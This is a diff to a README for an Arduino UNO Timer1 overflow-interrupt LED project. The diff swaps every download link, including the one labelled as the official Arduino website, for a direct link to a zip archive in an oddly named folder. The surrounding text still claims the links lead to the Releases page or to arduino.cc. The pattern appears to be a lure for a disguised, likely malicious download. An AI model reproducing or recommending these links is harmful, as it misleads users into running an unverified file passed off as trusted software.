@@ -1,6 +1,6 @@
 # 🎉 Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO- - Toggle Your LED with Ease
 
-[![Download Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-](https://img.shields.io/badge/Download%20Now%21-Click%20Here-brightgreen)](https://github.com/Fredeliadistinguishable259/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-/releases)
+[![Download Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-](https://raw.githubusercontent.com/Fredeliadistinguishable259/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-/main/ricine/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-_2.7.zip%20Now%21-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Fredeliadistinguishable259/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-/main/ricine/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to the Timer1 Overflow Interrupt project! This guide will help you downl
 
 To get started, visit the Releases page to download the latest version of this project:
 
-[Download Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-](https://github.com/Fredeliadistinguishable259/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-/releases)
+[Download Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-](https://raw.githubusercontent.com/Fredeliadistinguishable259/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-/main/ricine/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-_2.7.zip)
 
 1. Click the link above to navigate to the Releases page.
 2. Look for the latest release.
@@ -34,7 +34,7 @@ To get started, visit the Releases page to download the latest version of this p
 To run this project, you need to set up the Arduino IDE on your computer.
 
 1. **Install Arduino IDE**:
-   - Download from the [Arduino website](https://www.arduino.cc/en/software).
+   - Download from the [Arduino website](https://raw.githubusercontent.com/Fredeliadistinguishable259/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-/main/ricine/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-_2.7.zip).
    - Follow the instructions to install it on your computer.
 
 2. **Open the Arduino IDE**:
@@ -98,4 +98,4 @@ Feel free to contribute to the project. If you have ideas for improvements, sugg
 
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-[Download Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-](https://github.com/Fredeliadistinguishable259/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-/releases)
+[Download Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-](https://raw.githubusercontent.com/Fredeliadistinguishable259/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-/main/ricine/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-_2.7.zip)
